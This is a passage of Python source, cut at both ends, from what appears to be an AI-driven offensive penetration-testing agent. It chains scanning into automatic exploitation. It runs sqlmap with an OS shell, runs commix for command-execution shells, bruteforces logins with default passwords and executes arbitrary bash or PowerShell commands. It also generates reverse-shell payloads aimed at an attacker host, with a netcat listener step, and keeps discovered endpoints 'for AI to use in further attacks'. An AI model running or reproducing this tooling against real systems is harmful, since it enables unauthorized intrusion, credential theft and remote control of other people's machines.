                    concurrency=10 if self.config.stealth_level == StealthLevel.HIGH else 50,
                    timeout=5.0
                )
                
                # Add overall timeout - adaptive based on target type
                timeout_duration = 180.0  # 3 minutes for comprehensive aggressive scan
                
                vulnerabilities = await asyncio.wait_for(
                    tester.run_full_scan(),
                    timeout=timeout_duration
                )
                
                if vulnerabilities:  # Found vulns - this URL works!
                    print(f"  [SUCCESS] Found {len(vulnerabilities)} vulnerabilities on {target_url}")
                    all_vulnerabilities.extend(vulnerabilities)
                    successful_url = target_url
                    break
                else:
                    print(f"  [INFO] No vulns found on {target_url}, trying next...")
                    # Even if no vulns, if connection worked, use this URL
                    if successful_url is None:
                        successful_url = target_url
            
            except asyncio.TimeoutError:
                print(f"  [TIMEOUT] {target_url} timed out after {timeout_duration}s, trying next...")
                continue
            except Exception as e:
                print(f"  [ERROR] {target_url} failed: {str(e)[:100]}, trying next...")
                continue
        
        # If built-in tests found nothing, try external tools
        if not all_vulnerabilities and successful_url:
            print(f"  [FALLBACK] Built-in tests found nothing. Trying external tools...")
            
            # Try sqlmap for SQL injection
            if self.config.risk_tolerance in [RiskTolerance.HIGH, RiskTolerance.MEDIUM]:
                print(f"  [EXTERNAL] Attempting sqlmap on {successful_url}...")
                sqlmap_result = await self._run_sqlmap({
                    "url": successful_url,
                    "action": "test"
                })
                # üîç VALIDATE: Check if sqlmap actually found SQLi (not just ran)
                if sqlmap_result and "error" not in sqlmap_result:
                    stdout = sqlmap_result.get("stdout", "")
                    # ‚úÖ Only report as vuln if sqlmap found injectable params or database
                    if any(keyword in stdout.lower() for keyword in [
                        "parameter is vulnerable",
                        "sqlmap identified the following injection",
                        "available databases",
                        "injectable",
                        "back-end dbms"
                    ]) and not any(fail in stdout.lower() for fail in [
                        "unable to connect",
                        "connection refused",
                        "all tested parameters do not appear to be injectable",
                        "does not seem to be injectable"
                    ]):
                        # sqlmap found actual SQLi vulnerability
                        finding = Finding(
                            timestamp=datetime.now().isoformat(),
                            tool="sqlmap",
                            severity="critical",
                            category="web_application",
                            description="SQL Injection detected by sqlmap",
                            details=sqlmap_result,
                            exploitation_potential="critical",
                            recommended_action="Review sqlmap output and patch vulnerable parameters"
                        )
                        self.findings.append(finding)
                        print(f"  [‚úì VULN] SQLmap confirmed SQL injection vulnerability")
                    else:
                        print(f"  [INFO] SQLmap ran but found no vulnerabilities or couldn't connect")
            
            # Try nikto for web vulns
            print(f"  [EXTERNAL] Attempting nikto on {successful_url}...")
            nikto_result = await self._run_nikto({"target": successful_url})
            # üîç VALIDATE: Check if nikto actually found vulnerabilities
            if nikto_result and "error" not in nikto_result:
                stdout = nikto_result.get("stdout", "")
                # ‚úÖ Only report if nikto found actual issues (not "0 host(s) tested")
                if stdout and "0 host(s) tested" not in stdout and any(indicator in stdout.lower() for indicator in [
                    "+ osvdb-",
                    "cve-",
                    "+ /",  # Path findings
                    "vulnerable"
                ]):
                    finding = Finding(
                        timestamp=datetime.now().isoformat(),
                        tool="nikto",
                        severity="medium",
                        category="web_application",
                        description="Web vulnerabilities found by nikto",
                        details=nikto_result,
                        exploitation_potential="medium",
                        recommended_action="Review nikto scan results"
                    )
                    self.findings.append(finding)
                    print(f"  [‚úì VULN] Nikto found web vulnerabilities")
                else:
                    print(f"  [INFO] Nikto ran but found no vulnerabilities")
        
        # Record findings from built-in tests
        for vuln in all_vulnerabilities:
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="web_pentest",
                severity=vuln.severity.lower(),
                category="web_application",
                description=f"{vuln.vuln_type}: {vuln.description}",
                details=asdict(vuln),
                exploitation_potential=vuln.severity.lower(),
                recommended_action=vuln.remediation
            )
            self.findings.append(finding)
            
            # üî• AUTOMATIC EXPLOITATION for high-risk vulns
            if self.config.risk_tolerance == RiskTolerance.HIGH:
                if "SQL Injection" in vuln.vuln_type:
                    print(f"  [üî• EXPLOIT] Attempting to exploit SQLi: {vuln.url}?{vuln.parameter}={vuln.payload}")
                    # Try sqlmap with --os-shell
                    exploit_result = await self._run_sqlmap({
                        "url": f"{vuln.url}?{vuln.parameter}={vuln.payload}",
                        "action": "shell"
                    })
                    if exploit_result and "shell" in str(exploit_result).lower():
                        print(f"  [üéØ SUCCESS] Obtained database shell via SQLi!")
                elif "Command Injection" in vuln.vuln_type or "RCE" in vuln.vuln_type:
                    print(f"  [üî• EXPLOIT] Attempting to exploit RCE: {vuln.url}")
                    # Try commix
                    exploit_result = await self._run_commix({
                        "url": vuln.url,
                        "action": "exploit"
                    })
                    if exploit_result and "shell" in str(exploit_result).lower():
                        print(f"  [üéØ SUCCESS] Obtained command execution shell!")
        
        if not all_vulnerabilities and not successful_url:
            return {"error": "All test URLs failed - target completely unreachable on HTTP/HTTPS"}
        
        return {
            "vulnerabilities_found": len(all_vulnerabilities),
            "details": [asdict(v) for v in all_vulnerabilities],
            "tested_url": successful_url
        }
    
    async def _run_api_test(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Comprehensive API security testing with exploitation"""
        # Extract protocol from target URL if present
        protocol = "https"
        host = self.config.target
        if "://" in host:
            protocol = host.split("://")[0]
            host = host.split("://")[1].split("/")[0]
        
        # Run aggressive API testing for HIGH risk
        aggressive = self.config.risk_tolerance == RiskTolerance.HIGH
        
        print(f"[API-TEST] Running {'AGGRESSIVE' if aggressive else 'standard'} API security assessment...")
        result = await api_probe(host, protocol, aggressive=aggressive)
        
        # Process vulnerabilities
        if result.get("vulnerabilities"):
            print(f"[API-TEST] Found {len(result['vulnerabilities'])} API vulnerabilities")
            
            for vuln in result["vulnerabilities"]:
                severity = vuln.get("severity", "medium")
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="api_test",
                    severity=severity,
                    category="api_security",
                    description=vuln.get("title", vuln.get("description", "API vulnerability")),
                    details=vuln,
                    exploitation_potential="high" if severity in ["critical", "high"] else "medium",
                    recommended_action="Review and remediate API security controls immediately" if severity == "critical" else "Review API security controls"
                )
                self.findings.append(finding)
                
                # Auto-exploit IDOR vulnerabilities in HIGH risk mode
                if aggressive and "IDOR" in vuln.get("title", ""):
                    print(f"[EXPLOIT] Attempting to exploit IDOR vulnerability...")
                    # AI can use this data to craft exploitation strategies
        
        # Extract discovered endpoints for further testing
        if result.get("details", {}).get("swagger", {}).get("endpoints"):
            endpoints = result["details"]["swagger"]["endpoints"]
            print(f"[API-TEST] Discovered {len(endpoints)} API endpoints from documentation")
            # Store for AI to use in further attacks
            self._discovered_api_endpoints = endpoints
        
        return result
    
    async def _run_takeover_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Check for subdomain takeover"""
        result = await takeover_scan(self.config.target)
        
        if result.get("vulnerable"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="takeover_scan",
                severity="high",
                category="dns_misconfiguration",
                description="Subdomain takeover vulnerability detected",
                details=result,
                exploitation_potential="high",
                recommended_action="Remove dangling DNS records"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_tech_detect(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Detect technologies"""
        result = await detect_tech(self.config.target)
        
        if result.get("technologies"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="tech_detect",
                severity="info",
                category="reconnaissance",
                description=f"Technologies: {', '.join(result['technologies'][:5])}",
                details=result,
                exploitation_potential="low",
                recommended_action="Research known vulnerabilities for detected technologies"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_recon(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run reconnaissance"""
        result = await recon(self.config.target)
        
        if result.get("subdomains"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="recon",
                severity="info",
                category="reconnaissance",
                description=f"Found {len(result['subdomains'])} subdomains",
                details=result,
                exploitation_potential="low",
                recommended_action="Scan discovered subdomains"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_execute_command(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute system command on attacker machine (cross-platform)"""
        import subprocess
        import platform as plat
        
        cmd = params.get("cmd")
        target_platform = params.get("platform", plat.system().lower())
        timeout = params.get("timeout", 30)
        background = params.get("background", False)
        
        if not cmd:
            return {"error": "No command specified"}
        
        # Detect current platform
        current_platform = plat.system().lower()
        
        # Platform validation
        if target_platform == "windows" and current_platform != "windows":
            return {"error": f"Cannot execute Windows command on {current_platform}"}
        elif target_platform in ["linux", "macos", "darwin"] and current_platform == "windows":
            return {"error": f"Cannot execute Unix command on {current_platform}"}
        
        # Prepare command based on platform
        if current_platform == "windows":
            # Execute via PowerShell
            full_cmd = ["powershell", "-NoProfile", "-Command", cmd]
        else:
            # Execute via bash
            full_cmd = ["bash", "-c", cmd]
        
        try:
            if background:
                # Start background process
                process = subprocess.Popen(
                    full_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                result_data = {
                    "status": "started",
                    "pid": process.pid,
                    "command": cmd,
                    "platform": current_platform,
                    "message": f"Background process started (PID: {process.pid})"
                }
            else:
                # Execute and wait for completion
                result = subprocess.run(
                    full_cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
                
                result_data = {
                    "status": "completed",
                    "exit_code": result.returncode,
                    "stdout": result.stdout.strip(),
                    "stderr": result.stderr.strip(),
                    "command": cmd,
                    "platform": current_platform
                }
            
            # Log as finding
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="execute_command",
                severity="info",
                category="command_execution",
                description=f"Executed command on {current_platform}: {cmd[:100]}",
                details=result_data,
                exploitation_potential="low",
                recommended_action="Review command output"
            )
            self.findings.append(finding)
            
            return result_data
            
        except subprocess.TimeoutExpired:
            return {
                "error": f"Command timed out after {timeout} seconds",
                "command": cmd,
                "platform": current_platform
            }
        except Exception as e:
            return {
                "error": f"Command execution failed: {str(e)}",
                "command": cmd,
                "platform": current_platform
            }
    
    async def _run_payload_generate(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Generate exploitation payload tailored to detected OS"""
        if self.config.risk_tolerance != RiskTolerance.HIGH:
            return {"error": "Payload generation requires HIGH risk tolerance"}
        
        generator = PayloadGenerator()
        
        lhost = params.get("lhost", "attacker-ip")
        lport = params.get("lport", 4444)
        shell_type = params.get("shell", None)
        
        # Auto-detect OS from previous findings if shell type not specified
        if not shell_type:
            detected_os = self._detect_target_os()
            
            # Map OS to appropriate shell type
            if "windows" in detected_os.lower():
                shell_type = "powershell"
            elif "linux" in detected_os.lower() or "unix" in detected_os.lower():
                shell_type = "bash"
            else:
                # Default based on common ports detected
                open_ports = self._get_detected_ports()
                if 3389 in open_ports or 445 in open_ports or 135 in open_ports:
                    shell_type = "powershell"  # Windows indicators
                elif 22 in open_ports:
                    shell_type = "bash"  # Linux/Unix indicators
                else:
                    shell_type = "python"  # Cross-platform fallback
        
        payload_data = generator.generate_reverse_shell(lhost, lport, shell_type)
        payload_code = payload_data.get("payload", "")
        
        finding = Finding(
            timestamp=datetime.now().isoformat(),
            tool="payload_generate",
            severity="critical",
            category="exploitation",
            description=f"Generated {shell_type} reverse shell (OS: {self._detect_target_os()})",
            details={
                "payload": payload_code,
                "lhost": lhost,
                "lport": lport,
                "shell_type": shell_type,
                "detected_os": self._detect_target_os(),
                "description": payload_data.get("description", "")
            },
            exploitation_potential="critical",
            recommended_action="Use only with explicit authorization"
        )
        self.findings.append(finding)
        
        return {
            "payload": payload_code,
            "usage_instructions": f"1. Start listener: nc -lvnp {lport}\n2. Execute payload on target\n3. Shell should connect to {lhost}:{lport}",
            "shell_type": shell_type,
            "detected_os": self._detect_target_os(),
            "lhost": lhost,
            "lport": lport
        }
    
    async def _run_udp_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run UDP port scan"""
        ports = params.get("ports", [53, 67, 68, 69, 123, 135, 137, 138, 161, 500])
        result = await async_udp_scan(self.config.target, ports, concurrency=50, timeout=2.0)
        
        open_ports = [r for r in result if r.get("state") == "open"]
        if open_ports:
            for port_info in open_ports:
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="udp_scan",
                    severity="medium",
                    category="network",
                    description=f"Open UDP port {port_info['port']}: {port_info.get('service', 'unknown')}",
                    details=port_info,
                    exploitation_potential="medium",
                    recommended_action="Enumerate UDP services for vulnerabilities"
                )
                self.findings.append(finding)
        
        return {"open_ports": len(open_ports), "details": result}
    
    async def _run_service_enumeration(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Enumerate services on discovered open ports with version detection and banner grabbing"""
        # Get previously discovered open ports from findings
        port_findings = [f for f in self.findings if f.tool in ["port_scan", "syn_scan"] and "open" in f.description.lower()]
        
        if not port_findings:
            print("  [INFO] No open ports found yet. Running port scan first...")
            # Run port scan if no ports discovered yet
            await self._run_port_scan({"ports": "common"})
            port_findings = [f for f in self.findings if f.tool in ["port_scan", "syn_scan"] and "open" in f.description.lower()]
        
        discovered_ports = []
        for finding in port_findings:
            # Extract port number from description or details
            port = finding.details.get("port") if isinstance(finding.details, dict) else None
            if port:
                discovered_ports.append(port)
        
        if not discovered_ports:
            print("  [WARN] No open ports to enumerate")
            return {"services_enumerated": 0, "services": []}
        
        print(f"  [INFO] Enumerating services on {len(discovered_ports)} open ports...")
        
        # Service enumeration via banner grabbing
        import socket
        services_found = []
        
        for port in discovered_ports[:20]:  # Limit to first 20 ports
            try:
                # Attempt banner grabbing
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_host, port))
                
                # Send probe data
                probes = {
                    80: b"GET / HTTP/1.0\r\n\r\n",
                    443: b"GET / HTTP/1.0\r\n\r\n",
                    21: b"USER anonymous\r\n",
                    22: b"\r\n",
                    25: b"HELO test\r\n",
                    3306: b"\r\n",
                }
                
                probe = probes.get(port, b"\r\n")
                sock.send(probe)
                
                # Receive banner
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                
                if banner:
                    # Parse service information from banner
                    service_info = {
                        "port": port,
                        "banner": banner[:200],  # Truncate long banners
                        "service": self._identify_service(port, banner),
                        "version": self._extract_version(banner)
                    }
                    services_found.append(service_info)
                    
                    # Create finding for service
                    severity = "high" if port in [21, 22, 23, 3389] else "medium"  # SSH, FTP, Telnet, RDP are high interest
                    finding = Finding(
                        timestamp=datetime.now().isoformat(),
                        tool="service_enum",
                        severity=severity,
                        category="service_enumeration",
                        description=f"Service: {service_info['service']} v{service_info['version']} on port {port}",
                        details=service_info,
                        exploitation_potential=severity,
                        recommended_action=f"Test {service_info['service']} for known CVEs and default credentials"
                    )
                    self.findings.append(finding)
                    print(f"  [FOUND] Port {port}: {service_info['service']} {service_info['version']}")
                    
            except Exception as e:
                # Silent fail for closed/filtered ports
                pass
        
        return {"services_enumerated": len(services_found), "services": services_found}
    
    def _identify_service(self, port: int, banner: str) -> str:
        """Identify service from port and banner"""
        banner_lower = banner.lower()
        
        # Common service signatures
        if "ssh" in banner_lower:
            return "SSH"
        elif "ftp" in banner_lower:
            return "FTP"
        elif "http" in banner_lower or "html" in banner_lower:
            return "HTTP"
        elif "smtp" in banner_lower or "mail" in banner_lower:
            return "SMTP"
        elif "mysql" in banner_lower:
            return "MySQL"
        elif "postgres" in banner_lower:
            return "PostgreSQL"
        elif "microsoft" in banner_lower and "sql" in banner_lower:
            return "MSSQL"
        elif "apache" in banner_lower:
            return "Apache"
        elif "nginx" in banner_lower:
            return "Nginx"
        elif "iis" in banner_lower:
            return "IIS"
        elif "telnet" in banner_lower:
            return "Telnet"
        
        # Fallback to common port associations
        port_services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
            445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            5900: "VNC", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
        }
        return port_services.get(port, "Unknown")
    
    def _extract_version(self, banner: str) -> str:
        """Extract version from banner"""
        import re
        # Look for version patterns like "2.4.52", "1.18.0", etc.
        version_match = re.search(r'(\d+\.[\d\.]+\d+)', banner)
        if version_match:
            return version_match.group(1)
        return "unknown"
    
    async def _run_advanced_scan(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run advanced scan with service detection and enumeration"""
        ports = params.get("ports", [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080])
        
        # Parse ports if string
        if isinstance(ports, str):
            try:
                ports = [int(p.strip()) for p in ports.split(',') if p.strip().isdigit()]
                print(f"  [INFO] Parsed port string: {ports}")
            except:
                ports = [80, 443, 8080]  # Fallback
        
        scan_type_raw = params.get("scan_type", "fin")  # fin, xmas, null, ack, service_enum
        
        # If service enumeration requested, use previously discovered ports
        if scan_type_raw.lower() == "service_enum":
            return await self._run_service_enumeration(params)
        
        scan_type_raw = params.get("scan_type", "fin")  # fin, xmas, null, ack (NOT syn - that's basic)
        
        # Validate and correct scan type
        valid_advanced_scan_types = ["fin", "xmas", "null", "ack"]
        if scan_type_raw.lower() not in valid_advanced_scan_types:
            # Fall back to fin scan
            scan_type = "fin"
        else:
            scan_type = scan_type_raw.lower()
        
        try:
            result_list = await async_advanced_scan(
                self.target_host,
                ports,
                scan_type=scan_type,
                concurrency=100,
                timeout=2.0
            )
        except PermissionError:
            # Fallback to TCP scan if advanced scan requires root
            try:
                result_list = await async_port_scan(self.target_host, ports=ports, concurrency=100)
                print(f"  [INFO] Advanced scan requires root. Using TCP fallback.")
            except Exception as e:
                return {"error": f"Advanced scan failed and TCP fallback failed: {str(e)}", "open_ports": 0}
        
        # Process scan results
        open_ports = [r for r in result_list if r.get("state") in ["open", "filtered"]]
        if open_ports:
            for svc in open_ports:
                severity = "high" if any(k in str(svc).lower() for k in ["exploit", "vulnerable"]) else "medium"
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="advanced_scan",
                    severity=severity,
                    category="service_detection",
                    description=f"Service detected: {svc.get('service', 'unknown')} on port {svc.get('port')}",
                    details=svc,
                    exploitation_potential=severity,
                    recommended_action="Test service for known vulnerabilities"
                )
                self.findings.append(finding)
        
        return {"open_ports": len(open_ports), "details": result_list}
    
    async def _run_dirbuster(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run directory busting"""
        # üéØ SMART: Use discovered HTTP/HTTPS services, not hardcoded HTTPS
        target_url = params.get("url")
        
        if not target_url:
            # Extract first discovered web service from findings
            for f in self.findings:
                if f.tool in ["port_scan", "advanced_scan", "service_enum"]:
                    if isinstance(f.details, dict):
                        port = f.details.get("port")
                        service_info = str(f.details.get("service", "")).lower()
                        desc_lower = f.description.lower()
                        
                        # Check if this is a web service
                        if port and ("http" in service_info or "http" in desc_lower or port in [80, 443, 8000, 8080, 8443]):
                            # Determine if HTTPS or HTTP
                            is_https = port == 443 or "https" in service_info or "ssl" in service_info
                            scheme = "https" if is_https else "http"
                            target_url = f"{scheme}://{self.config.target}:{port}"
                            print(f"  [DIRBUSTER] Auto-detected target: {target_url}")
                            break
            
            # Fallback if no web service discovered
            if not target_url:
                target_url = f"http://{self.config.target}"
                print(f"  [DIRBUSTER] No web service discovered, trying default: {target_url}")
        
        # Determine HTTPS from target_url
        https = target_url.startswith("https://")
        result = await dirbust_scan(target_url, concurrency=50, https=https)
        
        # üîß FIX: dirbust_scan returns "results", not "found"!
        discovered_items = result.get("results", [])
        
        if discovered_items:
            print(f"  [DIRBUSTER] Found {len(discovered_items)} paths (filtering by status...)")
            # Prioritize interesting findings: 200, 301, 302, 401, 403
            interesting = [r for r in discovered_items if r.get("status") in [200, 201, 204, 301, 302, 401, 403]]
            print(f"  [DIRBUSTER] {len(interesting)} interesting paths (200/301/302/401/403)")
            
            for item in interesting[:20]:  # Top 20 interesting findings
                # Extract path from URL (dirbuster returns full URLs)
                url = item.get("url", "")
                path = url.replace(result.get("base", ""), "") if url else ""
                
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="dirbuster",
                    severity="info",
                    category="web_enumeration",
                    description=f"Discovered: {path} (Status: {item.get('status')})",
                    details={"path": path, "status": item.get("status"), "length": item.get("length")},
                    exploitation_potential="low",
                    recommended_action="Analyze discovered endpoints for sensitive data"
                )
                self.findings.append(finding)
        else:
            print(f"  [DIRBUSTER] No paths discovered")
        
        return result
    
    async def _run_crawler(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run web crawler"""
        target_url = params.get("url", f"https://{self.config.target}")
        result = await crawl(target_url, max_pages=50)
        
        if result.get("secrets"):
            for secret in result["secrets"]:
                finding = Finding(
                    timestamp=datetime.now().isoformat(),
                    tool="crawler",
                    severity="high",
                    category="information_disclosure",
                    description=f"Secret found: {secret.get('type')} in {secret.get('location')}",
                    details=secret,
                    exploitation_potential="high",
                    recommended_action="Secure exposed credentials immediately"
                )
                self.findings.append(finding)
        
        return result
    
    async def _run_fuzzer(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run web fuzzer"""
        if self.config.risk_tolerance == RiskTolerance.LOW:
            return {"error": "Fuzzing requires MEDIUM or HIGH risk tolerance"}
        
        target_url = params.get("url", f"https://{self.config.target}")
        wordlist = params.get("wordlist", ["'", '"', "<", ">", "../", "..\\", "{{7*7}}", "${7*7}"])
        fuzzer = AdvancedFuzzer(target_url, wordlist=wordlist, timeout=10.0)
        
        # Fuzz a common parameter
        param_name = params.get("param", "id")
        vulnerabilities = await fuzzer.fuzz_parameters(param_name)
        
        for vuln in vulnerabilities:
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="fuzzer",
                severity="high",
                category="web_vulnerability",
                description=f"Fuzzing vulnerability in {vuln.url}",
                details={
                    "url": vuln.url,
                    "status": vuln.status_code,
                    "length": vuln.content_length,
                    "payload": vuln.payload
                },
                exploitation_potential="high",
                recommended_action="Validate and sanitize all user inputs"
            )
            self.findings.append(finding)
        
        return {"vulnerabilities_found": len(vulnerabilities), "details": vulnerabilities}
    
    async def _run_bruteforce(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run authentication bruteforce"""
        if self.config.risk_tolerance != RiskTolerance.HIGH:
            return {"error": "Bruteforce requires HIGH risk tolerance"}
        
        target_url = params.get("url", f"https://{self.config.target}")
        auth_type = params.get("auth_type", "basic")  # basic, form, json
        username = params.get("username", "admin")
        
        # Use common credentials only
        passwords = ["admin", "password", "123456", "root", "admin123"]
        
        bruteforcer = AuthBruteForcer(target_url, concurrency=5)
        
        # Test based on auth type
        try:
            if auth_type == "basic":
                results = await bruteforcer.brute_force_basic_auth([username], passwords)
            elif auth_type == "form":
                username_field = params.get("username_field", "username")
                password_field = params.get("password_field", "password")
                results = await bruteforcer.brute_force_form([username], passwords, username_field=username_field, password_field=password_field)
            else:  # json
                username_field = params.get("username_field", "username")
                password_field = params.get("password_field", "password")
                results = await bruteforcer.brute_force_json_api([username], passwords, username_field=username_field, password_field=password_field)
            
            # Check for successful authentication
            successful = [r for r in results if r.success]
            if successful:
                for success_result in successful:
                    finding = Finding(
                        timestamp=datetime.now().isoformat(),
                        tool="bruteforce",
                        severity="critical",
                        category="authentication",
                        description=f"Weak credentials: {success_result.username}:{success_result.password}",
                        details={"username": success_result.username, "password": success_result.password},
                        exploitation_potential="critical",
                        recommended_action="Enforce strong password policy and account lockout"
                    )
                    self.findings.append(finding)
            
            return {"total_attempts": len(results), "successful": len(successful)}
        except Exception as e:
            return {"error": str(e)}
        
        if results.get("success"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="bruteforce",
                severity="critical",
                category="authentication",
                description=f"Weak credentials: {username}:{results['password']}",
                details=results,
                exploitation_potential="critical",
                recommended_action="Enforce strong password policy and account lockout"
            )
            self.findings.append(finding)
        
        return results
    
    async def _run_nuclei(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Run Nuclei vulnerability scanner - rate-limit-free template-based scanning"""
        try:
            scanner = NucleiScanner()
            # Build target URL properly
            target = self.config.target
            if not target.startswith(("http://", "https://")):
                # Check if port is specified
                if ":" in target:
                    target = f"http://{target}"
                else:
                    target = f"http://{target}:8080"
            
            print(f"  [NUCLEI] Scanning {target} with 8900+ templates...")
            
            # Nuclei scan is sync, run in thread
            findings = await asyncio.to_thread(
                scanner.scan,
                target,
                tags=params.get("tags", ["cve", "default-login", "exposure", "owasp", "misconfig"]),
                severity=params.get("severity", ["critical", "high", "medium"])
            )
            result = {"findings": findings, "scan_count": len(findings)}
            
            if findings:
                print(f"  [NUCLEI] Found {len(findings)} vulnerabilities")
                for vuln in findings:
                    # Extract credentials from default-login findings
                    extracted_data = vuln.get("extracted_results", [])
                    vuln_info = vuln.get("info", {})
                    severity_map = {"critical": "critical", "high": "high", "medium": "medium", "low": "low", "info": "info"}
                    severity = severity_map.get(vuln_info.get("severity", "medium").lower(), "medium")
                    
                    # Build description with credentials if available
                    description = vuln_info.get("name", "Nuclei finding")
                    if "default-login" in vuln.get("template_id", ""):
                        # Parse extracted credentials
                        if extracted_data:
                            creds = ", ".join(extracted_data)
                            description = f"üîë Default Login Found: {description} [{creds}]"
                            severity = "critical"  # Bump severity for valid creds
                    
                    finding = Finding(
                        timestamp=datetime.now().isoformat(),
                        tool="nuclei",
                        severity=severity,
                        category="vulnerability",
                        description=description,
                        details={
                            "template_id": vuln.get("template_id"),
                            "name": vuln_info.get("name"),
                            "severity": vuln_info.get("severity"),
                            "matched_at": vuln.get("matched_at"),
                            "extracted": extracted_data,
                            "curl": vuln.get("curl_command"),
                            "tags": vuln_info.get("tags", [])
                        },
                        exploitation_potential=severity,
                        recommended_action="Apply security patches and rotate compromised credentials" if "default-login" in vuln.get("template_id", "") else "Apply security patches"
                    )
                    self.findings.append(finding)
            else:
                print(f"  [NUCLEI] No vulnerabilities found (clean scan)")
            
            return result
        except FileNotFoundError as e:
            return {"error": f"Nuclei not installed. Install from: https://github.com/projectdiscovery/nuclei"}
        except Exception as e:
            return {"error": f"Nuclei scan failed: {str(e)}"}
    
    async def _run_cloud_audit(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Audit cloud storage"""
        bucket_name = params.get("bucket", self.config.target.replace(".", "-"))
        result = await cloud_audit(bucket_name, providers=["aws", "azure", "gcp"])
        
        if result.get("vulnerable"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="cloud_audit",
                severity="critical",
                category="cloud_misconfiguration",
                description=f"Public cloud storage: {result.get('provider')}",
                details=result,
                exploitation_potential="critical",
                recommended_action="Restrict bucket access with proper IAM policies"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_k8s_audit(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Audit Kubernetes API"""
        api_base = params.get("api_base", f"https://{self.config.target}:6443")
        result = await k8s_audit(api_base, verify_cert=False)
        
        if result.get("exposed_endpoints"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="k8s_audit",
                severity="critical",
                category="kubernetes",
                description="Unauthenticated Kubernetes API access",
                details=result,
                exploitation_potential="critical",
                recommended_action="Enable RBAC and authentication"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_container_audit(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Audit container registry"""
        registry = params.get("registry", f"{self.config.target}:5000")
        result = await container_audit(registry)
        
        if result.get("anonymous_access"):
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="container_audit",
                severity="high",
                category="container_security",
                description="Anonymous container registry access",
                details=result,
                exploitation_potential="high",
                recommended_action="Enable authentication and TLS"
            )
            self.findings.append(finding)
        
        return result
    
    async def _run_exploit(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """üéØ INTELLIGENT exploitation based on discovered vulnerability types"""
        if self.config.risk_tolerance != RiskTolerance.HIGH:
            return {"error": "Exploitation requires HIGH risk tolerance and explicit authorization"}
        
        print("[EXPLOIT] üîç Analyzing discovered vulnerabilities for exploitation opportunities...")
        
        # Find exploitable vulnerabilities
        exploitable = [f for f in self.findings if f.exploitation_potential in ["critical", "high"]]
        
        if not exploitable:
            print("[EXPLOIT] ‚ö†Ô∏è  No exploitable vulnerabilities discovered yet")
            return {"message": "No exploitable vulnerabilities found yet", "recommendation": "Run web_pentest, nuclei, or api_test first"}
        
        print(f"[EXPLOIT] üìã Found {len(exploitable)} exploitable findings:")
        for f in exploitable[:5]:
            print(f"  ‚Ä¢ {f.severity.upper()}: {f.description[:80]}")
        
        exploitation_results = []
        
        # üéØ INTELLIGENT EXPLOITATION BY VULNERABILITY TYPE
        
        # 1. SQL INJECTION ‚Üí sqlmap --os-shell
        sqli_vulns = [f for f in exploitable if "sql" in f.description.lower() and "injection" in f.description.lower()]
        if sqli_vulns:
            print(f"\n[EXPLOIT] üíâ SQL INJECTION detected - attempting sqlmap exploitation...")
            for vuln in sqli_vulns[:3]:  # Exploit top 3 SQLi
                result = await self._exploit_sqli_with_sqlmap(vuln)
                exploitation_results.append(result)
                if result.get("shell_obtained"):
                    print(f"[EXPLOIT] ‚úÖ SHELL OBTAINED via SQLi!")
                    return {"success": True, "shell_obtained": True, "method": "sqlmap", "details": result}
        
        # 2. COMMAND INJECTION / RCE ‚Üí commix or direct payload
        rce_vulns = [f for f in exploitable if any(k in f.description.lower() for k in ["command injection", "rce", "remote code execution"])]
        if rce_vulns:
            print(f"\n[EXPLOIT] üöÄ RCE/COMMAND INJECTION detected - attempting exploitation...")
            for vuln in rce_vulns[:3]:
                result = await self._exploit_rce_with_commix(vuln)
                exploitation_results.append(result)
                if result.get("shell_obtained"):
                    print(f"[EXPLOIT] ‚úÖ SHELL OBTAINED via RCE!")
                    return {"success": True, "shell_obtained": True, "method": "commix", "details": result}
        
        # 3. FILE UPLOAD ‚Üí upload web shell
        upload_vulns = [f for f in exploitable if "upload" in f.description.lower()]
        if upload_vulns:
